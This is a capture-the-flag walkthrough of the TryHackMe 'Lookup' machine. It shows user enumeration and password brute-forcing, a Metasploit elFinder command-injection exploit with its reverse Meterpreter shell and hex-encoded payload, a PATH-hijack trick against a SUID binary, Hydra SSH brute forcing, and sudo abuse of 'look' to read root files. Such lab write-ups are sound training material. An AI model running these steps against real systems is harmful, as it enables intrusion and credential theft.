---
layout: post
title: Lookup
date: 2025-05-28 10:00:00 +0100
categories: [Walkthroughs]
tags: [tryhackme, linux, web-app, privesc]
---
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Lookup-Image.png?raw=true)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | TryHackMe       |
| OS | Linux        |
| Difficulty | Easy        |
| Release Date | 22 November 2024        |
| Link to machine | [Lookup](https://tryhackme.com/room/lookup)        |

# Highlights
Burp Suite, Caido, Password Brute Forcing, User Enumeration, SUID, Linux Privilege Escalation

---

# Open ports enumeration
Nmap scan

```bash
nmap -T4 -p- -A 10.10.159.119 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 16:09 BST
Nmap scan report for 10.10.159.119
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   30.07 ms 10.14.0.1
2   22.25 ms 10.10.159.119

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.77 seconds
```

Nmap returns open ports for ```SSH``` (Port 22) and a web server ```HTTP```  (Port 80) ```(Apache HTTP version 2.4.41)```. 

# SSH Enumeration
We attempt to connect via ```SSH``` to confirm that password authentication is enabled. Once we have confirmation we move on to port 80 as we do not have valid credentials yet
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/SSH%20enum.png?raw=true)
# HTTP Enumeration

After adding the IP address to our ```/etc/hosts``` file, we navigate to http://lookup.thm and we are presented with a login form. Using Wappalyzer, the browser extension, we can see that the server is Apache HTTP Server version 2.4.41 running on Ubuntu, like we seen on Nmap
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/wappalyzer.png?raw=true)
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/HTTPenum.png?raw=true)

It's time to open Burp Suite to intercept the request to see what the application does in the back end.


# Burp Suite Fuzzing

We attempt a login request with the user ```root``` and the password ```test```, just to receive a response and have an idea on how it looks.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/BurpSuite1Lookup.png?raw=true)
Attempting the usual obvious usernames, without changing the password, we receive a different error with the user ```admin```. The error states ```“Wrong Password”```. We can consider this a form of ```information disclosure```, as it allows us to enumerate what users exist.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/BurpSuite2Lookup.png?raw=true)

# Caido Automate
For this task, we are going to use Caido Automate, since Burp Suite community edition has rate limiting for Intruder, Caido’s free version can perform the same task much faster when a large wordlist is being used. In just few seconds, we find another valid user : ```jose```.
If you are interesed in how Caido works, you can check out [this great video](https://www.youtube.com/watch?v=4rpbtc4nPAA&t=919s) made by Alex Olsen from TCM Security.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/CaidoPassword.png?raw=true)

# Brute Force jose's password
Now that we have a valid user, we can attempt to brute force the password. Many tools can be used for this, ```Burp Suite Intruder```, ```Caido’s Automate``` or ```Hydra``` to mention some.
Since we already have Caido open, we are going to use it.
So we set the username to ```jose```, change the placeholder to the password field and load our ```rockout.txt``` wordlist.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/CaidoPassword2.png?raw=true)

# Using the valid credentials on the login form

We go back to our login form with valid credentials, and once we log in, we get redirected to ```http://files.lookup.thm```, which the browser fails to resolve. We can fix that by adding this entry to our ```/etc/hosts file```. Once added, we reload the browser and we get presented with the following page:

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Server-Login.png?raw=true)

Clicking on the help button we can see that the application is using ```elFinder```, a Web File manager, and the version in use is ```2.1.47```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/elFinder-Lookup.png?raw=true)

Using searchsploit, we get a few results, one of them being a metasploit module.
```bash
searchsploit elFinder 2.1.47
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2.1.47 - 'PHP connector' Command Injection                                                | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                        | php/remote/46539.rb
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                        | php/remote/46539.rb
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
# Foothold
We launch ```metasploit```, look for the module found with ```searchsploit```, set the ```options``` for the module, and execute the attack.
```bash
msfconsole # launch metasploit
search elfinder exiftran # search the exploit we found with searchsploit

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

use 0 # as this is the number associated with the result from the search
options # to see what parameters need set to launch the exploit
set rhost files.lookup.thm # set rhost as it is a required option
set lhost tun0 # set the lhost to tun0, this will set the local host IP to one we are using currintly with THM's VPN.
# LPORT is optional as it is already set to 4444, can be changed if 4444 is already in use
run # run or exploit command will launch the attack
```

```bash
[*] Started reverse TCP handler on 10.14.104.180:4444 
[*] Uploading payload 'cdmWhsy.jpg;echo 6370202e2e2f66696c65732f63646d576873792e6a70672a6563686f2a202e4b4647527666352e706870 |xxd -r -p |sh& #.jpg' (1957 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.KFGRvf5.php) ...
[*] Sending stage (40004 bytes) to 10.10.159.119
[+] Deleted .KFGRvf5.php
[*] Meterpreter session 2 opened (10.14.104.180:4444 -> 10.10.159.119:44608) at 2025-05-28 17:07:17 +0100
shell
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > shell
```
Metasploit will upload a malicious .jpg file that cointains a ```reverse shell``` with the payload set for ```meterpreter```. Once we see “Meterpreter session X opened…” we can type ```shell``` to interact with the machine.

We have a shell as the ```www-data``` user, in the directory ```/var/www/files.lookup.thm/public_html/elFinder/php```

```bash
whoami
www-data

pwd
/var/www/files.lookup.thm/public_html/elFinder/php
```

We attempt to upgrade our shell using the command ```python -c "import pty;pty.spawn('/bin/bash')”```, but fails as python is not installed on the machine
```bash
python -c "import pty;pty.spawn('/bin/bash')"
/bin/sh: 5: python: not found
```
We try again the same command but for ```python3``` and we successfully upgrade the shell


```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$
```
Navigating to the home directory, we discover a ```think``` directory that is possibly a user. We have ```RX rights``` so let's open the think directory and using the command ```ls```, we find our user flag location.


```bash
cd /
www-data@lookup:/$ ls
ls
bin   etc   lib32   lost+found  opt   run        snap      sys  var
boot  home  lib64   media       proc  sbin       srv       tmp
dev   lib   libx32  mnt         root  seddc5fn0  swap.img  usr
www-data@lookup:/$ cd home
cd home
www-data@lookup:/home$ ls
ls
think
www-data@lookup:/home$ 
www-data@lookup:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Jun  2  2023 .
drwxr-xr-x 19 root  root  4096 Jan 11  2024 ..
drwxr-xr-x  5 think think 4096 Jan 11  2024 think
www-data@lookup:/home$ cd think
cd think
www-data@lookup:/home/think$ ls
ls
user.txt
www-data@lookup:/home/think$
```
Running the command ```cat /etc/passwd | grep /bin/bash``` to only retrieve the results containing /bin/bash and we are left with  2 users : ```root``` and ```think```.
```bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/usr/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash
```

We continue our enumeration, this time looking at SUID binaries, finding an interesting one that is not usually found when this command is run:
```  /usr/sbin/pwm```with the permission string ```-rwsr-sr-x``` and owner ```root```.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
     3279     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    14400    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
     3387     16 -rwsr-xr-x   1 root     root               14488 Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
     2045     52 -rwsr-xr--   1 root     messagebus         51344 Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm
      491     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount
```

Running the command, we can see is executing ```id``` to extract the user ID and is looking for a file called ```.passwords```

```bash
www-data@lookup:/home/think$ cd /
cd /
www-data@lookup:/$ ./usr/sbin/pwm
./usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
We cannot create the www-data directory in ```/home``` because of permissions, but we can trick ```./usr/sbin/pwm``` to run the command ```id``` from a location that we can control by:
* creating a fake ```id``` command and placing it in ```/tmp/id```
* making the ```/tmp/id``` executable
* add ```/tmp``` to ```$PATH```
* checking that ```/tmp``` has been added to ```$PATH```

```bash
echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory # expected output
```

Now we can run the ```pwm``` command again:
```bash
www-data@lookup:/$ ./usr/sbin/pwm
./usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/pwm-enum.png?raw=true)

We tricked ```/usr/sbin/pwm``` to use the ```id``` command that we have created and placed in ```/tmp/id``` after being added to ```$PATH``` env variable. We save the results of the ```.password``` file on our attack machine and we call it ```passwords.txt```

---

Why does this work?

The key for this exploit is in ```[!] Running 'id' command to extract the username and user ID (UID)```: Because ```id``` being run using the ```$PATH``` variable instead of being set as absolute path, allows an attacker to create a malicious file with the same name into a writable directory and prepend that directory to ```$PATH```.

---

# Pivot to user think

Now that we have a valid user and we were able to read the .password file, we can attempt to ```brute force```  SSH login, using ```Hydra``` to get confirmation that credentials are valind and we can connect to the target.
```bash
hydra -l think -P passwords.txt -t 4 ssh://lookup.thm -v
```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Hydra-PasswordSpray-Lookup.png?raw=true)

# Privilege Escalation and root flag
Once connected via ```SSH``` as ```think```, we start enumerating ```user privileges```

```bash
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
think@lookup:~$
```

With our findings, we check [```GTFO bins```](https://gtfobins.github.io/gtfobins/look/#sudo), and we find a clear path to our ```root``` flag.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/RootExploit.png?raw=true)

This allows us to read the root.txt flag with the user think, but we could use it to read the ```/etc/shadow``` file and crack the hashes of all users, or read any ```SSH keys``` if they are present, then use the key to login as root using SSH.

Enjoy!.